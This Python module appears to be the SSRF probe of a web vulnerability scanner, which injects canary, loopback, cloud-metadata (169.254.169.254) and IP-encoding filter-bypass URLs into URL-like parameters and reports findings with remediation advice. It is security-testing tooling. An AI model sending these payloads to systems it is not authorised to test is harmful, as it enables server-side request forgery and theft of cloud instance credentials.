import re

from ..core.models import Finding, Severity
from ..core.targets import Target, replace_query_param, replace_body_param
from .base import BaseProbe

SSRF_PARAMS = re.compile(
    r"(url|uri|link|src|source|dest|destination|proxy|fetch|feed|callback|redirect|next|target|host|endpoint|image|file|path|domain|site|page|action|continue|out|view|load|template|api|webhook|avatar|photo|href|q|u)",
    re.I,
)

SSRF_PAYLOADS = [
    "http://webpent-canary.invalid/ssrf-canary",
    "http://127.0.0.1:9/ssrf-canary",
    "http://[::1]:9/ssrf-canary",
    "http://169.254.169.254/latest/meta-data/",
]

SSRF_MARKERS = ["webpent-canary", "ssrf-canary"]
METADATA_MARKERS = ["ami-id", "instance-id", "iam/", "meta-data"]

# server-generated fetch language that appears only when a fetch actually happened
FETCH_CONTEXT = re.compile(r"fetched|downloaded|retrieved|upstream|proxy response|connecting to|request to .* (sent|made)", re.I)

ALTERNATE_BLOCKS = [
    ("http://0x7f000001/ssrf-canary", "127.0.0.1 (hex IP)"),
    ("http://2130706433/ssrf-canary", "127.0.0.1 (decimal IP)"),
    ("http://127.1/ssrf-canary", "127.0.0.1 (short form)"),
    ("http://localtest.me/ssrf-canary", "loopback via DNS"),
]


class SsrfProbe(BaseProbe):
    name = "ssrf"
    description = "Server-side request forgery via URL-taking parameters"

    def run(self, target: Target) -> list[Finding]:
        findings: list[Finding] = []
        params = list(target.params.keys())
        if target.data:
            params += [k for k in target.data if k not in params]

        for param in params:
            if not SSRF_PARAMS.search(param):
                continue
            f = self._test_param(target, param)
            if f:
                findings.append(f)
        return findings

    def _send(self, target: Target, param: str, value: str):
        if target.data is not None and param in target.data:
            return self.client.request(
                target.method, target.url, data=replace_body_param(target.data, param, value)
            )
        return self.client.request(
            target.method, replace_query_param(target.url, param, value), data=target.data
        )

    @staticmethod
    def _is_fetch_evidence(text: str, payload: str, markers: list[str]) -> bool:
        """Marker present AND not merely a verbatim echo of the input.

        If the raw payload appears in the response, the parameter is likely just
        reflected — unless the response also contains server-side fetch language.
        """
        if not any(m in text for m in markers):
            return False
        if payload not in text:
            return True
        return bool(FETCH_CONTEXT.search(text))

    def _test_param(self, target: Target, param: str) -> Finding | None:
        for payload in SSRF_PAYLOADS:
            try:
                resp = self._send(target, param, payload)
            except Exception:
                continue
            text = resp.text or ""

            if "169.254.169.254" in payload and self._is_fetch_evidence(text, payload, METADATA_MARKERS):
                return self.finding(
                    probe=self.name,
                    severity=Severity.CRITICAL,
                    title=f"SSRF to cloud metadata endpoint via parameter '{param}'",
                    url=target.url,
                    param=param,
                    payload=payload,
                    evidence="Cloud metadata content present in response and input was not simply echoed — likely full SSRF to IMDS",
                    remediation="Block link-local metadata IPs; allowlist outbound destinations; disable redirects to private ranges.",
                    confidence="high",
                )

            if "invalid" in payload and self._is_fetch_evidence(text, payload, SSRF_MARKERS):
                return self.finding(
                    probe=self.name,
                    severity=Severity.HIGH,
                    title=f"SSRF: server fetched attacker-controlled URL (parameter '{param}')",
                    url=target.url,
                    param=param,
                    payload=payload,
                    evidence="Canary content present in response without verbatim reflection — server likely performed the request",
                    remediation="Allowlist outbound URLs; resolve and reject private/loopback/link-local addresses.",
                    confidence="high",
                )

        for payload, label in ALTERNATE_BLOCKS:
            try:
                resp = self._send(target, param, payload)
            except Exception:
                continue
            text = resp.text or ""
            if payload not in text and any(m in text for m in SSRF_MARKERS):
                return self.finding(
                    probe=self.name,
                    severity=Severity.HIGH,
                    title=f"SSRF filter bypass via {label} (parameter '{param}')",
                    url=target.url,
                    param=param,
                    payload=payload,
                    evidence=f"Server fetched loopback using {label} — naive IP validation present but bypassable",
                    remediation="Parse the URL with a strict parser, resolve DNS, and reject non-public IPs after resolution.",
                    confidence="medium",
                )
        return None
